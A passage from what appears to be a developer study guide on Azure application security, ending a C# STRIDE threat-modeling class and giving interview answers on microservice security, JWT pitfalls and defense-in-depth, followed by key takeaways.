                "TDE for SQL Database",
                "Encryption at rest for blob storage",
                "Private endpoints for all Azure services",
                "Data masking for sensitive fields",
                "Least privilege RBAC"
            },
            ["Denial of Service"] = new List<string>
            {
                "Azure DDoS Protection Standard",
                "Rate limiting (1000 req/min per user)",
                "Auto-scaling (2-50 instances)",
                "Circuit breakers for downstream services",
                "Request throttling in API Management"
            },
            ["Elevation of Privilege"] = new List<string>
            {
                "Principle of least privilege",
                "Just-in-time admin access",
                "Privileged Identity Management (PIM)",
                "Regular access reviews",
                "Separation of duties"
            }
        };
    }

    public enum ThreatType
    {
        Spoofing,
        Tampering,
        Repudiation,
        InformationDisclosure,
        DenialOfService,
        ElevationOfPrivilege
    }

    public class Threat
    {
        public string Id { get; set; }
        public ThreatType Type { get; set; }
        public string Description { get; set; }
        public string Asset { get; set; }
        public string Mitigation { get; set; }
        public string Severity { get; set; }
        public string Status { get; set; }
    }
}
```

---

## Interview Questions

**Q1: How would you secure a microservices architecture on Azure?**

**Answer:**
```
1. Authentication & Authorization:
   - Azure AD for user authentication
   - Service-to-service auth with Managed Identity
   - OAuth 2.0 / OpenID Connect
   - API Gateway (APIM) for centralized auth

2. Network Security:
   - Private endpoints for all services
   - Network Security Groups (NSGs)
   - Service mesh (Istio/Linkerd) for mTLS
   - Azure Firewall for egress filtering

3. Data Protection:
   - Encryption at rest (TDE, storage encryption)
   - Encryption in transit (TLS 1.3)
   - Key Vault for secrets management
   - Data classification and DLP policies

4. Application Security:
   - Input validation in all services
   - Rate limiting per service
   - OWASP Top 10 mitigations
   - Security headers

5. Monitoring:
   - Centralized logging (Application Insights)
   - Security alerts and anomaly detection
   - Audit all sensitive operations
   - SIEM integration

6. CI/CD Security:
   - Secret scanning
   - Dependency vulnerability scanning
   - Static code analysis
   - Signed container images
```

**Q2: Explain JWT token security and potential vulnerabilities.**

**Answer:**
- **Structure**: Header + Payload + Signature (all Base64URL encoded)
- **Signing**: Use RS256 (asymmetric) in production, not HS256 (symmetric)
- **Validation**: Always validate signature, issuer, audience, expiration
- **Vulnerabilities**:
  - Algorithm confusion (switch RS256 to HS256)
  - Weak signing keys
  - No expiration check
  - Token stored in localStorage (XSS risk)
  - No revocation mechanism
- **Mitigations**:
  - Short-lived access tokens (15 min)
  - Long-lived refresh tokens with rotation
  - Store tokens in httpOnly cookies
  - Implement token blacklist for revocation
  - Validate all claims programmatically

**Q3: How do you implement defense-in-depth for a web application?**

**Answer:**
```
Layer 1 - Perimeter: WAF, DDoS protection, Azure Front Door
Layer 2 - Network: NSGs, private endpoints, Azure Firewall
Layer 3 - Compute: Managed Identity, VM encryption, patching
Layer 4 - Application: AuthN/AuthZ, input validation, secure coding
Layer 5 - Data: Encryption at rest/transit, Key Vault, TDE
Layer 6 - Identity: MFA, conditional access, PIM
Layer 7 - Monitoring: Logging, alerts, SIEM, threat detection

Key: Multiple layers so if one fails, others still protect
```

---

## Key Takeaways

1. **Authentication ≠ Authorization**: Verify identity, then check permissions
2. **Least Privilege**: Grant minimum necessary access, no more
3. **Defense in Depth**: Multiple security layers, assume breach
4. **Zero Trust**: Never trust, always verify, every request
5. **Secrets Management**: Never hardcode, always use Key Vault
6. **Security Headers**: CSP, HSTS, X-Frame-Options are essential
7. **Input Validation**: Validate all input, parameterize all queries
8. **Logging**: Log all security events, monitor for anomalies
9. **Regular Updates**: Keep dependencies current, scan for vulnerabilities
10. **Threat Modeling**: Identify threats early, mitigate proactively

---

## Next Steps

- Day 13: DevOps CI/CD and Release Strategies
- Implement OWASP Top 10 mitigations
- Set up security scanning in CI/CD
- Practice threat modeling
- Configure Azure security features
